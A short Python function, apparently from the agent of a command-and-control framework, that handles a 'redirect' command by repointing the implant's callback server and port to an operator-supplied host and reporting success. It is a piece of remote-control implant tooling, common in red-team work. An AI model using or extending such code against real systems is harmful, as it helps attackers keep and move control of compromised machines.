def redirect(task_id, command):

    params = command.split(":")

    print(len(params))

    if len(params) != 2:
        response = {
            'task_id': task_id,
            "user_output": "usage redirect <host:port>",
            'completed': True
        }
        responses.append(response)
        return

    else:

        ip = params[0]
        port = params[1]

        agent.Server = "http://" + ip
        agent.Port = port

        response = {
                'task_id': task_id,
                "user_output": "Redirected to {}:{}".format(agent.Server,agent.Port),
                'completed': True
            }
        responses.append(response)

        print("\t- Redirect Done")

        return
